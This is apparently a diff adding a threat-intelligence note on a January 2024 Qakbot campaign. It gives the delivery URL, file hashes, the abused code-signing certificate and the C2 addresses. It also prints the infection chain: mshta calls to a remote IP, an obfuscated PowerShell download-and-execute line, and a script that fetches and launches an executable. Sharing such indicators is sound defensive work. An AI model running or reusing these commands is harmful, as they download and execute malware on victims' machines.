@@ -1,0 +1,54 @@
+26.01.2024 | Qakbot | bmw01 | Campaign 2024-01-26T11:25:33 | Version 500.486
+
+*************************************************
+
+.url https://sivasosb.org.tr/td4s/
+.zip 18785530de0c06d99d817d29d0785470ae108d05f7bc2db218b00d2185ae50af  
+.ps1 cc5fa220f92319e0e063e4e19c5e09b17e2e459ee33a0b763417080b1c4ecfed 
+.exe fda2abd24764809fb36d4d2ee7ab5f6e8c06381fe6d9bb191bde62411c96ba92
+
+*************************************************
+
+Code Signing Certificate
+Organisation:	SOFTWARE MEDICAL DEVICES LIMITED
+Issuer:	SSL.com EV Code Signing Intermediate CA RSA R3
+Algorithm:	sha256WithRSAEncryption
+Valid from:	2023-12-15T14:59:56Z
+Valid to:	2024-12-14T14:59:56Z
+Serial number:	 4a3f0bf26862263dac496033f50594cb
+Thumbprint Algorithm:	SHA256
+Thumbprint:	 04cd040132912db6eb2a24fce431eb9aab1828661fd87cef96e011d79f5d6082
+Source:	This information was brought to you by ReversingLabs A1000 Malware Analysis Platform
+
+*************************************************
+
+Exec >
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Decrd.js
+
+cmd.exe /c cd C:\Users\Admin\AppData\Local\Temp&&mshta http://91.92.248.152/z
+
+mshta  http://91.92.248.152/z
+
+powershell.exe" $c1='(New-Object Net.We'; $c4='bClient).Downlo'; $c3='adString(''http://91.92.248.152/z/a.png'')';$TC=I`E`X ($c1,$c4,$c3 -Join '')|I`E`X
+
+$url = "https://amacey.com/x1g/sdfr"
+$file = $env:appdata + "\\file.exe"
+invoke-webrequest "https://amacey.com/x1g/sdfr" -outfile $file
+start-process "$env:APPDATA\\file.exe"
+
+*************************************************
+
+drop urls:
+
+https://amacey.com/x1g/sdfr
+
+*************************************************
+
+c2's
+
+https://116.202.110.87/teorema505
+https://146.70.158.28:6882/teorema505
+https://185.117.90.142:6882/teorema505
+https://185.156.172.62/teorema505
+https://77.73.39.175:32103/teorema505
